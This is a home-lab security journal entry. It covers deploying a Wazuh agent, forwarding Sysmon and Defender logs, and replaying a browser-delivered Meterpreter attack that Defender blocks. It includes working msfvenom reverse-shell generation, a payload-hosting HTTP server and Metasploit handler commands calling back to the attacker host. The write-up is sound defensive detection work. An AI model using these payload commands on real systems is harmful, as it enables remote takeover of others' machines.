# Day 8 — Wazuh Agent Deployment and Detection Pipeline (Stage B)

## Status

In progress. Stage B has three parts and this note builds across sessions as each part completes.

- **Part 1 — Agent deployment and pipeline verification:** complete
- **Part 2 — Replay Phase 1 attacks against Wazuh:** Round 1 complete, Rounds 2 and 3 pending
- **Part 3 — Write custom rules for behavioral signatures:** pending

## Objective

Deploy the Wazuh agent to SOC-WINDOWS-01 (Non-Prod), confirm telemetry flows from the Windows endpoint to the Wazuh manager, replay the three Phase 1 Meterpreter attacks against the new monitoring stack with Defender enabled this time, and write custom detection rules for any behavioral signatures that the default ruleset misses.

## Environment

| Host | Role | IP | OS | Status |
|---|---|---|---|---|
| SOC-WAZUH-01 | Wazuh manager + indexer + dashboard | 192.168.65.6 | Ubuntu Server 24.04.4 LTS (ARM64) | Active |
| SOC-WINDOWS-01 (Non-Prod) | Primary victim with Wazuh agent | 192.168.65.4 | Windows 11 (ARM64) | Active, agent reporting |
| SOC-ATTACKER-01 | Attacker (Phase 1) | 192.168.65.3 | Kali Linux | Active during Round 1 |

## Part 1 — Agent Deployment and Pipeline Verification

### Pre-flight check

Started the session by confirming all three Wazuh services were still healthy after the overnight gap from Day 7:

```bash
sudo systemctl is-active wazuh-indexer wazuh-manager wazuh-dashboard
```

Returned three `active` lines. No service restarts needed.

### Generating the install command

Used the Wazuh dashboard's built-in agent deployment wizard at `Endpoints > Deploy new agent`. The wizard generates a customized PowerShell command with the manager IP and agent name pre-filled, which is cleaner than hand-editing a generic install command.

Selected:
- Platform: Windows (MSI 32/64 bits)
- Server address: `192.168.65.6`
- Agent name: `SOC-WINDOWS-01` (matches lab naming convention)
- Group: `default` (custom groups deferred to Part 3)

The generated command:

```powershell
Invoke-WebRequest -Uri https://packages.wazuh.com/4.x/windows/wazuh-agent-4.12.0-1.msi -OutFile $env:tmp\wazuh-agent; msiexec.exe /i $env:tmp\wazuh-agent /q WAZUH_MANAGER='192.168.65.6' WAZUH_AGENT_NAME='SOC-WINDOWS-01'
```

The `/q` flag installs silently with no GUI. Manager IP and agent name are baked into the install so no post-install config editing is needed for basic enrollment.

### Running the install on Windows

Opened Windows PowerShell **as Administrator** on SOC-WINDOWS-01 (right-click PowerShell, Run as administrator, UAC confirm). Admin rights are required because the MSI writes to `C:\Program Files (x86)\ossec-agent\` and registers a Windows service.

Pasted and ran the install command. Two phases:

1. **MSI download** — silent, roughly 5-10 seconds for the ~10 MB installer
2. **msiexec install** — silent, roughly 20 seconds

Then started the service:

```powershell
NET START WazuhSvc
```

Output:
```
The Wazuh service is starting.
The Wazuh service was started successfully.
```

Note: Windows Defender did not flag the Wazuh MSI on this ARM64-emulated Windows install. The MSI is a signed binary from a reputable vendor (Wazuh, Inc.), and Defender treated it accordingly. Relevant detail for the lab — in Phase 1 I had to disable Defender repeatedly. For Stage B going forward, Defender stays enabled.

### Confirming the agent enrolled

Navigated to the **Endpoints** view in the Wazuh dashboard. The new agent appeared immediately with full details auto-introspected by the manager:

| Field | Value |
|---|---|
| ID | 001 |
| Name | SOC-WINDOWS-01 |
| IP | 192.168.65.4 |
| Group | default |
| OS | Microsoft Windows 11 Home 10.0.26200.8457 |
| Cluster node | node01 |
| Version | v4.12.0 |
| Status | active |

Version match with the manager (both 4.12.0) — no version drift. Dashboard summary showed Disconnected: 0, Pending: 0, Never connected: 0. Clean enrollment.

### Configuring the agent to forward Sysmon events

The Wazuh agent reads several Windows Event Log channels by default (Security, Application, System), but Sysmon writes to its own dedicated channel — `Microsoft-Windows-Sysmon/Operational` — which the agent does not subscribe to out of the box. To make Phase 1's Sysmon telemetry visible in Wazuh, the agent's config file needs a new `localfile` block pointing at the Sysmon channel.

Opened the agent config in Notepad (launched from Admin PowerShell so it could save to a protected directory):

```powershell
notepad "C:\Program Files (x86)\ossec-agent\ossec.conf"
```

Added the following block alongside the existing `Application`, `Security`, and `System` blocks:

```xml
<localfile>
  <location>Microsoft-Windows-Sysmon/Operational</location>
  <log_format>eventchannel</log_format>
</localfile>
```

Saved, then restarted the agent service to pick up the new config:

```powershell
NET STOP WazuhSvc
NET START WazuhSvc
```

Both commands returned `successfully`. Within a minute, Sysmon events began appearing in the Wazuh indexer.

### First alert investigation — rule 92213

Opened **Threat Hunting** in the dashboard, filtered for `agent.name : SOC-WINDOWS-01`, and immediately saw a wall of events from the new agent. Most were level 3 baseline noise — Windows logon successes, `net.exe` discovery activity, generic process telemetry. One alert stood out:

> **May 22, 2026 @ 21:01:16 — Rule 92213 — Executable file dropped in folder commonly used by malware — level 15**

Rule level 15 is the highest severity Wazuh assigns. On a freshly-deployed agent with no attacks running, a critical alert is the kind of thing that demands triage before anything else gets done.

Clicked the row to expand the Document Details. The three fields that mattered:

```
data.win.eventdata.image:           C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
data.win.eventdata.targetFilename:  C:\Users\Ladi\AppData\Local\Temp\__PSScriptPolicyTest_<random>.ps1
data.win.eventdata.user:            WIN-KPHDAL23K4O\Ladi
```

**Triage:** This is a known false positive. PowerShell's built-in behavior creates `__PSScriptPolicyTest_*.ps1` files in the user's local Temp directory every time it launches a new session. The file is used by PowerShell itself to verify that the current execution policy is being correctly enforced — it writes the test script, attempts to run it, and uses the result to confirm the policy state. The file is then cleaned up.

Wazuh rule 92213 fires on any process writing an executable or script file to a path commonly abused by malware staging. `AppData\Local\Temp` qualifies. The rule has to be broad enough to catch real malware dropping payloads, and that breadth inherently catches Microsoft's own PowerShell self-test.

Three reasons this is benign in context:
1. The dropping process is `powershell.exe` from the protected `C:\Windows\System32\WindowsPowerShell\v1.0\` directory — that's the legitimate signed Microsoft binary
2. The target filename pattern (`__PSScriptPolicyTest_*`) is documented PowerShell behavior, not a randomized payload name
3. The dropping user matches the active logged-in user, consistent with normal session activity

**Disposition:** false positive. Documented for future tuning — in Part 3 of Stage B, this rule can have an exception added so the `__PSScriptPolicyTest_*` filename pattern doesn't trigger a level 15 alert. Suppressing the noise will make real high-severity alerts during attack replay stand out clearly.

### Pipeline verified

The fact that rule 92213 fired at all is the most important outcome of Part 1. The chain works:

> Sysmon Event ID 11 (File Created) generated on the Windows endpoint → captured by the Wazuh agent's eventchannel reader → forwarded to the Wazuh manager on port 1514 → matched against rule 92213 by `wazuh-analysisd` → indexed by the Wazuh indexer → displayed in the Threat Hunting view of the dashboard

Every component of the stack from Day 7 is operational. The agent is reporting. The Sysmon channel is being read. Default rules are matching. The dashboard is rendering. Stage B Part 1 is complete.

## Part 2 — Round 1: Browser-Delivered Meterpreter (Defender Enabled)

### Objective

Replay Phase 1 Day 4's attack chain — browser-delivered Meterpreter reverse shell — with Windows Defender enabled this time, and observe what the combined Defender + Wazuh stack catches versus what Phase 1's no-Defender baseline showed.

### Attack infrastructure setup

On Kali, regenerated the payload fresh rather than reusing Phase 1's binary. Two reasons: Defender's cloud-based protection may have already submitted Phase 1's hash for analysis, and documenting two different hashes from the same `msfvenom` command illustrates why hash-based blocking alone is insufficient.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.65.3 LPORT=4444 -f exe -o evil.exe
```

New IOCs captured:

| Field | Value |
|---|---|
| Path | /home/kali/evil.exe |
| Size | 7168 bytes |
| MD5 | 2e142d535b3e6390b5f1ee36d137c3ba |
| SHA256 | 3d1aa645d4b5b14b1c3e80576b45b0e99276582322c376939429130cf5989794 |

Phase 1 Day 4 IOCs for comparison:

| Field | Value |
|---|---|
| MD5 | 82FC735C28439C7A4F694AFA793079B8 |
| SHA256 | 1C80E26DD48F1B1CA4A849D5E6336245431F44B4FA4FE4583BBE37D09D48EB86 |

Same msfvenom command, completely different hashes. This is exactly why hash-based IOCs alone don't catch a determined attacker — re-rolling the payload takes seconds and changes every hash.

Started the HTTP server in one Kali terminal:

```bash
python3 -m http.server 8080
```

Started the Metasploit listener in a second terminal:

```bash
sudo msfconsole -q
```

In msfconsole:
```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.65.3
set LPORT 4444
exploit -j
```

Confirmed `Started reverse TCP handler on 192.168.65.3:4444`.

### Defender verification

Before triggering the download, verified Defender state on Windows:

```powershell
Get-MpComputerStatus | Select-Object AntivirusEnabled, RealTimeProtectionEnabled, AMRunningMode
```

Returned `AntivirusEnabled: True`, `RealTimeProtectionEnabled: True`, `AMRunningMode: Normal`. Defender is active and the cloud protection module is engaged.

### The download attempts

Opened Microsoft Edge on SOC-WINDOWS-01 and navigated to `http://192.168.65.3:8080/evil.exe`. Result: download blocked. Repeated. Same result.

Kali's HTTP server logged two successful GET requests at 19:10:31 and 19:11:19 (Kali time, UTC):

```
192.168.65.4 - - [22/May/2026 19:10:31] "GET /evil.exe HTTP/1.1" 200 -
192.168.65.4 - - [22/May/2026 19:11:19] "GET /evil.exe HTTP/1.1" 200 -
```

Both transfers completed at the network layer (HTTP 200). The blocking happened **after** the file reached Windows, not at network transit.

Windows Edge's Downloads pane showed multiple entries with mixed states — "Removed," "Canceled," and partial completions. SmartScreen and Defender were both intervening. No copy of `evil.exe` survived in the Downloads folder. The Meterpreter listener received no callback. Reverse shell never established.

In real-world terms: **the attack failed at the endpoint defense layer.** Phase 1's research baseline (Defender off, attack succeeds) is now contrasted with Stage B's realistic baseline (Defender on, attack blocked).

### Visibility gap discovered

The expected next step was confirming Wazuh captured Defender's blocking actions. Opened the Threat Hunting view, filtered for `agent.name : SOC-WINDOWS-01`, time range "Last 15 minutes." The dashboard returned 16 hits — but none of them were Defender events. The events visible were generic Windows logon successes, `net.exe` discovery activity, and several `61102` "Windows System error event" entries plus one `61110` "Multiple System error events" at level 10.

The expected Defender quarantine alerts were absent.

### Diagnostic — checking the endpoint directly

To distinguish between "Defender didn't act" and "Wazuh didn't see Defender act," queried Windows directly for Defender's event log:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" -MaxEvents 10
```

Output showed exactly what was expected:

| Time | Event ID | Description |
|---|---|---|
| 10:11:24 PM | 1117 | Microsoft Defender Antivirus has detected malware (action taken) |
| 10:11:19 PM | 1116 | Microsoft Defender Antivirus has detected malware (warning) |
| 10:10:37 PM | 1117 | Microsoft Defender Antivirus has detected malware (action taken) |
| 10:10:32 PM | 1116 | Microsoft Defender Antivirus has detected malware (warning) |

Detection-action pairs five seconds apart. Two complete blocking cycles, one per download attempt, exactly matching the Kali HTTP server's two GET requests after timezone adjustment.

**Defender acted. Wazuh just wasn't seeing it.**

### Root cause and fix

Windows Defender writes its events to a dedicated log channel: `Microsoft-Windows-Windows Defender/Operational`. The Wazuh agent reads Security, Application, System, and (after the earlier edit) the Sysmon channel — but does not subscribe to the Defender channel by default.

Same fix pattern as the Sysmon subscription. Edited the agent config:

```xml
<localfile>
  <location>Microsoft-Windows-Windows Defender/Operational</location>
  <log_format>eventchannel</log_format>
</localfile>
```

(Note the literal space in `Windows Defender` — that's how Microsoft named the channel.)

Restarted the agent:

```powershell
NET STOP WazuhSvc
NET START WazuhSvc
```

### Verification — re-triggering the attack

Re-downloaded `evil.exe` from Edge one more time. Defender blocked it again, as expected. Waited 30 seconds for the agent to ship the event to the manager. Refreshed the Wazuh dashboard.

This time, the top result was:

> **22:30:22 — SOC-WINDOWS-01 — Windows Defender: Antimalware platform performed an action to protect you from potentially unwanted software**

The Defender event was now flowing through Wazuh. Visibility gap closed.

### Document details from the captured event

Expanded the new alert in the dashboard. Key fields:

| Field | Value |
|---|---|
| data.win.eventdata.threatName | **Trojan:Win64/Meterpreter.AMTB** |
| data.win.eventdata.threatID | 2147942297 |
| data.win.eventdata.typeName | Concrete |
| data.win.system.channel | Microsoft-Windows-Windows Defender/Operational |
| data.win.system.eventID | 1117 |
| data.win.system.providerName | Microsoft-Windows-Windows Defender |

Defender classified the payload as **`Trojan:Win64/Meterpreter.AMTB`** — Microsoft's signature family for Meterpreter binaries. This is significant: Phase 1's `evil.exe` and Stage B's `evil.exe` have completely different file hashes, but both would be caught by this signature. Modern signature-based detection is pattern-aware, not hash-only. The behavioral pattern of "Metasploit-generated Meterpreter binary" is what fires the signature, not the specific byte sequence.

This connects directly to Phase 1's Day 6 conclusion: *port-based detection alone is insufficient; the reliable signal is behavioral.* Hash-based detection has the same limitation. Defender's signature works here because it abstracts above the hash level. A SIEM detection rule should aim for the same abstraction level — match on the behavioral chain, not the IOC.

### Round 1 outcome summary

| Layer | What happened | Telemetry source |
|---|---|---|
| Network delivery | Kali HTTP server returned evil.exe (2 GETs) | Kali HTTP server log |
| Browser interception | SmartScreen evaluated the download | `smartscreen.exe` process in Sysmon |
| File scan | Defender detected `Trojan:Win64/Meterpreter.AMTB` | Defender event 1116 |
| Defender action | File quarantined / removed | Defender event 1117 |
| SIEM capture | Wazuh now sees Defender events (after agent config fix) | Wazuh dashboard rule firing |

**Defense-in-depth caught the attack. The SIEM saw the catch (after fix). Visibility gap identified and remediated. Round 1 complete.**

### Lessons from Round 1

1. **Signature-based detection still works against off-the-shelf Metasploit payloads.** Defender's cloud-delivered protection identified `Trojan:Win64/Meterpreter.AMTB` regardless of hash differences. This isn't "signatures are dead" — it's "modern signatures are pattern-based."
2. **Default Wazuh agent config has a real visibility gap on Windows Defender events.** This is a one-line config fix but it's not obvious from the install docs. Worth surfacing in any production deployment checklist.
3. **The hash-versus-behavior argument is now demonstrated empirically.** Two different evil.exe hashes, same detection result. Hash IOCs decay; behavioral signatures persist.
4. **In Phase 1 the attack always succeeded because Defender was off; in Stage B the attack failed because Defender was on.** Same attack, different security posture, different outcome. This isn't a contradiction — Phase 1 was telemetry research, Stage B is realistic monitoring.

## Part 2 — Round 2: PowerShell-Delivered Meterpreter (Defender Enabled)

*(Pending — next session)*

## Part 2 — Round 3: Port Blending 8443 (Defender Enabled)

*(Pending — next session)*

## Part 3 — Custom Rules for Behavioral Signatures

*(Pending — after Round 3)*
